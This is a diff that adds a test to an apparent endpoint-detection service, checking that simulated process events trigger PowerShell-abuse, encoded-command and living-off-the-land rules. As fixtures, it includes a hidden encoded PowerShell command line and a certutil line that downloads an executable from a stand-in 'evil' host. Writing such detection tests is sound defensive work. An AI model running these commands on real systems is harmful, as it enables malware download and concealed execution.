@@ -127,6 +127,23 @@ def test_analyst_can_triage(client, enrolled_device, db_session_factory):
     assert client.post(f"/api/admin/detections/{det_id}/ack", headers=h).status_code == 200
 
 
+def test_process_telemetry_end_to_end_detections(client, enrolled_device):
+    """A real process-monitor-style event drives multiple detections."""
+    client.post("/api/agent/telemetry", json={"events": [
+        {"source": "process", "action": "exec", "severity": "info",
+         "summary": "Process started: powershell",
+         "details": {"pid": 900, "ppid": 800, "name": "powershell",
+                     "command_line": "powershell -nop -w hidden -enc SQBFAFgA"}},
+        {"source": "process", "action": "exec", "severity": "info",
+         "summary": "Process started: certutil",
+         "details": {"pid": 901, "ppid": 800, "name": "certutil",
+                     "command_line": "certutil.exe -urlcache -f http://evil/x.exe"}},
+    ]}, headers=enrolled_device["headers"])
+    dets = client.get("/api/admin/detections", headers=ADMIN_HEADERS).json()
+    rule_ids = {d["rule_id"] for d in dets}
+    assert {"powershell_abuse", "encoded_command", "lolbin_execution"} <= rule_ids
+
+
 def test_auto_isolate_response_when_enabled(client, enrolled_device, monkeypatch):
     from app.core.config import settings
     monkeypatch.setattr(settings, "detection_auto_isolate", True)
